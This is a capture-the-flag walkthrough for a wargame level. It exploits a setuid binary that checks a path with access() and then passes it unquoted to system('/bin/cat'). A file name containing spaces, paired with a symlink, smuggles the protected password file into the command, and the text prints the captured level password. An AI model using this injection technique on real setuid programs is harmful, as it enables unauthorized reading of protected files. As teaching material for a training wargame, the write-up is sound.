Leviathan Level 2 → Level 3
===========================

Level Goal
----------

There is no information for this level, intentionally.

Solution
========

There's no hint text or anything else for this level. So let's look around what we can find in the home directory:

```
leviathan2@leviathan:~$ ls -al
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
-rw-r--r--  1 root       root        675 May 15  2017 .profile
```

There's a binary called **printfile** which is owned by user **leviathan3** and which has the Sticky Bit set.
Let's check what the file does. Since we want to gather the password of user leviathan3, we'll give the password-file of that user as an argument to **printfile**:

```
leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

Unfortunately it does not print the password as expected but just says "You cant have that file" because we obviously don't have read permissions. 
So let's try something similar with a file that is owned by our currently logged-in user:

```
leviathan2@leviathan:~$ mkdir /tmp/n3lke
leviathan2@leviathan:~$ echo "Hello World" > /tmp/n3lke/test
leviathan2@leviathan:~$ ./printfile /tmp/n3lke/test
Hello World
```

This works fine. So let's see if we can find out what's going on under the hood:

```
leviathan2@leviathan:~$ ltrace ./printfile /tmp/n3lke/test
__libc_start_main(0x804852b, 2, 0xffffd714, 0x8048610 <unfinished ...>
access("/tmp/n3lke/test", 4)                                                                                                     = 0
snprintf("/bin/cat /tmp/n3lke/test", 511, "/bin/cat %s", "/tmp/n3lke/test")                                                      = 24
geteuid()                                                                                                                        = 12002
geteuid()                                                                                                                        = 12002
setreuid(12002, 12002)                                                                                                           = 0
system("/bin/cat /tmp/n3lke/test"Hello World
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                           = 0
+++ exited (status 0) +++
```
First observation: the binary internally uses **/bin/cat** in order to display the contents of a file. We do not see anything conspicuous in addition for the moment. 
We'll do the same for the password file which we don't have the appropriate read permissions for:

```
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x804852b, 2, 0xffffd714, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                                                                                      = -1
puts("You cant have that file..."You cant have that file...
)                                                                                               = 27
+++ exited (status 1) +++
```

If we compare both outputs we recognize that the function **access()** is executed at the beginning. So let's check what access() is used for by looking into its **man page**:

```
DESCRIPTION
       access() checks whether the calling process can access the file pathname.  If pathname is a symbolic link, it is dereferenced.

       The  mode  specifies  the  accessibility check(s) to be performed, and is either the value F_OK, or a mask consisting of the bitwise OR of one or more of R_OK, W_OK, and X_OK.  F_OK tests for the
       existence of the file.  R_OK, W_OK, and X_OK test whether the file exists and grants read, write, and execute permissions, respectively.
```

So as we already found out, access() is used to check whether the file given as an argument to the **printfile** binary has the appropriate read permissions.
Since we somehow have to manipulate the workflow of the binary, we take a more deeper look into the manpage of access() and find this pretty interesting information:

```
NOTES
       Warning:  Using  these calls to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short
       time interval between checking and opening the file to manipulate it.  For this reason, the use of this system call should be avoided.  (In the example just described, a safer  alternative  would
       be to temporarily switch the process's effective user ID to the real ID and then call open(2).)
```

Obviously we can trick access() to think that the password file of leviathan3 is owned by ourself. We just have to find a way to trick **access()** while giving **/bin/cat** a reasonable argument which it can process.
Fortunately **cat** takes multiple arguments for files to display one after another:

```
NAME
       cat - concatenate files and print on the standard output

SYNOPSIS
       cat [OPTION]... [FILE]...

DESCRIPTION
       Concatenate FILE(s) to standard output.
```

The trick now is to give ONE proper file name to **printfile** which satisfies **access()** as well as **/bin/cat**. 
That's done by chosing a file name which consists of more than one word separated by whitespaces. The first word is the most relevant one. The additional one or two words are just used to generate two different files in the local filesystem:
First of all we create a file named **powned by n3lke** which is owned by ourselfes. This files is used to trick **access()**:

```
leviathan2@leviathan:~$ mkdir /tmp/n3lke
leviathan2@leviathan:~$ touch /tmp/n3lke/pwned\ by\ n3lke
```

Afterwards we create a Symlink named **pwned** into the same directory which points to the desired password file of leviathan3 (the password file is found in **/etc/leviathan_pass/leviathan3**):

```
leviathan2@leviathan:~$ cd /tmp/n3lke
leviathan2@leviathan:/tmp/n3lke$ ln -s /etc/leviathan_pass/leviathan3 pwned
```

We now have a dummy file named **pwned** which is used to trick **access()** and a symlink to the password file of leviathan3 which we want to display:

```
leviathan2@leviathan:/tmp/n3lke$ ls -al
total 268
drwxr-sr-x   2 leviathan2 root   4096 Jun  7 18:41 .
drwxrws-wt 163 root       root 266240 Jun  7 18:40 ..
lrwxrwxrwx   1 leviathan2 root     30 Jun  7 18:41 pwned -> /etc/leviathan_pass/leviathan3
-rw-r--r--   1 leviathan2 root      0 Jun  7 18:41 pwned by n3lke
```

Finally we are ready to shoot. Let's execute **printfile** and grab the password for the next level: 

```
leviathan2@leviathan:/tmp/n3lke$ cd
leviathan2@leviathan:~$ ./printfile /tmp/n3lke/pwned\ by\ n3lke
Ahdiemoo1j
/bin/cat: by: No such file or directory
/bin/cat: n3lke: No such file or directory
```

Phew! That was tough! 😎
